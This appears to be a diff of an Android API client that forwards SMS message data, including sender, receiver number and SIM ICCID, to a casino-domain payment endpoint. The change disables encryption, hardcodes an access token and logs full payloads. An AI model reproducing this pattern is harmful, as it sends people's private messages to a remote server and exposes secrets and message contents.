@@ -38,10 +38,12 @@ public class ApiClient {
 
     private static final String TAG = "ApiClient";
     private static final MediaType JSON_MEDIA_TYPE = MediaType.get("application/json; charset=utf-8");
-    private static final String POST_URL = "https://emoney.win777.casino/pay/sms";
+    private static final String POST_URL = "https://emoney.win777.casino/pay/sms3money";
     private static final String ENCRYPTED_POST_URL = "https://emoney.win777.casino/pay/sms";
     private static final String SAMPLE_PUBLIC_KEY_BASE64 =
             "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtPRv+C4dCQwQYeGyKB5eeqcdcwnlNXBQ4zgnHTsPXzn3W2tfv8hg5zsedCZTWcU6RfboXHKD121mSBuq9FhTQ1Fcogq3UHQmbEu2+/yZSK+ovKv0Oemsh7UsdueMkY7rIIOXPhxQPYqlHnuw5NE/fNw+aZR9OBbEDtI2NBZyY9Pa8PBLIqdNLUJnIbC6HYoOmXfR+dAZVthdXQBUgcAiDyK/a9cT05zvQE4k78kBXaqZH8p4bepbFlem4ytvS7hXMynFQQXSBC76YLQGYCv0NN18wYixV8fquRCOmWcL130y1qnGp61flX0+9klkVaoCipCz2YMI4ZnPr5KhxFYQiwIDAQAB";
+    private static final String ALGORITHM = "RSA/ECB/OAEPWithSHA-256AndMGF1Padding";
+    private static final String TOKEN = "79db628d60bf411b3c2dfb80c14b6232";
 
     private final OkHttpClient client;
 
@@ -58,35 +60,6 @@ public class ApiClient {
         this.client = client;
     }
 
-    public boolean sendSms(String jsonPayload) {
-        RequestBody body = RequestBody.create(jsonPayload, JSON_MEDIA_TYPE);
-        Request request = new Request.Builder()
-                .url(POST_URL)
-                .post(body)
-                .build();
-
-        try (Response response = client.newCall(request).execute()) {
-            boolean success = response.isSuccessful();
-            if (!success) {
-                Log.w(TAG, "POST failed with code: " + response.code());
-            }
-            return success;
-        } catch (IOException exception) {
-            Log.e(TAG, "POST failed: " + exception.getMessage());
-            return false;
-        }
-    }
-
-    public String buildPayload(SmsModel sms, String receiverNumber) throws JSONException {
-        JSONObject jsonObject = buildBodyJson(sms, receiverNumber, "");
-        org.json.JSONArray data = new org.json.JSONArray();
-        data.put(jsonObject);
-
-        JSONObject payload = new JSONObject();
-        payload.put("data", data);
-        return payload.toString();
-    }
-
     public JSONObject buildBodyJson(SmsModel sms, String receiverNumber, String receiverIccid) throws JSONException {
         JSONObject jsonObject = new JSONObject();
         jsonObject.put("sender", sms.getSender());
@@ -100,38 +73,6 @@ public class ApiClient {
         return jsonObject;
     }
 
-    public boolean sendEncrypted(String plainJson) {
-        if (plainJson == null) {
-            return false;
-        }
-        try {
-            String encrypted = encryptJson(plainJson);
-            JSONObject requestBody = new JSONObject();
-
-            requestBody.put("token", "79db628d60bf411b3c2dfb80c14b6232"); 
-            requestBody.put("data", encrypted); 
-
-            Log.w(TAG, "Encrypted payload: " + requestBody.toString());
-
-            // Request request = new Request.Builder()
-            //         .url(ENCRYPTED_POST_URL)
-            //         .post(requestBody)
-            //         .build();
-
-            // try (Response response = client.newCall(request).execute()) {
-            //     boolean success = response.isSuccessful();
-            //     if (!success) {
-            //         Log.w(TAG, "Encrypted POST failed with code: " + response.code());
-            //     }
-            //     return success;
-            //}
-        } catch (Exception exception) {
-            Log.e(TAG, "Encrypted send failed: " + exception.getMessage());
-            return false;
-        }
-        return false;
-    }
-
     /**
      * Encrypts the SMS payload and enqueues an async POST to the encrypted endpoint.
      */
@@ -143,65 +84,91 @@ public class ApiClient {
             }
             return;
         }
+        final String bodyString = bodyJson.toString();
         try {
+            JSONArray data = new JSONArray();
+            data.put(new JSONObject(bodyString));
+            final String payloadJson = data.toString();
+            // String encrypted = encryptJson(payloadJson);
 
+            sendToServer(payloadJson, callback);
+            
+        } catch (Exception exception) {
+            Log.e(TAG, "Unexpected encryption error: " + exception.getMessage());
+            if (callback != null) {
+                callback.onFailure(bodyString, exception);
+            }
+        }
+    }
+
+    public void sendEncryptedListAsync(JSONArray bodyJsonArray, SendCallback callback) {
+        if (bodyJsonArray == null) {
+            Log.w(TAG, "Body JSON array is null; abort encrypted send.");
+            if (callback != null) {
+                callback.onFailure(null, new IllegalArgumentException("Body JSON array is null"));
+            }
+            return;
+        }
+        final String bodyString = bodyJsonArray.toString();
+        try {
+            // String encrypted = encryptJson(bodyString);
+
+            sendToServer(bodyString, null);
+        } catch (Exception exception) {
+            Log.e(TAG, "Unexpected encryption error: " + exception.getMessage());
+            if (callback != null) {
+                callback.onFailure(bodyString, exception);
+            }
+        }
+    }
+
+    private void sendToServer(String data, SendCallback callback) {
+        try {
             JSONObject requestJson = new JSONObject();
+            requestJson.put("token", TOKEN);
+            requestJson.put("data", data);
 
-            org.json.JSONArray data = new org.json.JSONArray();
-            data.put(bodyJson);
-            final String plainJson = data.toString();
-            String encrypted = encryptJson(plainJson);
-
-            requestJson.put("token", "79db628d60bf411b3c2dfb80c14b6232");
-            requestJson.put("data", encrypted); 
-
-            Log.w(TAG, "data raw: " + plainJson);
-            Log.w(TAG, "Encrypted payload: " + requestJson.toString());
-
+            Log.w(TAG, "Sending data: " + requestJson.toString());
+            
             RequestBody requestBody = RequestBody.create(requestJson.toString(), JSON_MEDIA_TYPE);
             Request request = new Request.Builder()
-                    .url(ENCRYPTED_POST_URL)
-                    .post(requestBody)
-                    .build();
+                .url(POST_URL)
+                .post(requestBody)
+                .build();
 
             client.newCall(request).enqueue(new Callback() {
                 @Override
                 public void onFailure(Call call, IOException e) {
-                    Log.e(TAG, "Encrypted POST failed: " + e.getMessage());
+                    Log.e(TAG, "POST failed: " + e.getMessage());
                     if (callback != null) {
-                        callback.onFailure(plainJson, e);
+                        callback.onFailure(data, e);
                     }
                 }
 
                 @Override
                 public void onResponse(Call call, Response response) {
                     if (!response.isSuccessful()) {
-                        Log.w(TAG, "Encrypted POST unsuccessful: code=" + response.code());
+                        Log.w(TAG, "POST unsuccessful: code=" + response.code());
                         if (callback != null) {
-                            callback.onFailure(plainJson, null);
+                            callback.onFailure(data, null);
                         }
-                    } else if (callback != null) {
-                        callback.onSuccess();
-                        Log.w(TAG, "Encrypted POST successful." + requestBody.toString());
+                    } else {
+                        Log.d(TAG, "POST successful.");
+                        if (callback != null) {
+                            callback.onSuccess();
+                        }
                     }
                     response.close();
                 }
             });
-        } catch (JSONException | GeneralSecurityException exception) {
-            Log.e(TAG, "Encrypted payload error: " + exception.getMessage());
+        } catch (Exception exception) {
+            Log.e(TAG, "Unexpected POST error: " + exception.getMessage());
             if (callback != null) {
-                callback.onFailure(null, exception);
+                callback.onFailure(data, exception);
             }
-        } catch (Exception e) {
-            throw new RuntimeException(e);
         }
     }
-
-    // private String encryptJson(String plainJson) throws GeneralSecurityException {
-    //     PublicKey publicKey = loadPublicKey(SAMPLE_PUBLIC_KEY_BASE64);
-    //     return RsaCryptoJava.encrypt(plainJson, publicKey);
-    // }
-    private static final String ALGORITHM = "RSA/ECB/OAEPWithSHA-256AndMGF1Padding";
+    
     public String encryptJson(String data) throws Exception {
         PublicKey publicKey = loadPublicKey(SAMPLE_PUBLIC_KEY_BASE64);
         Cipher cipher = Cipher.getInstance(ALGORITHM);
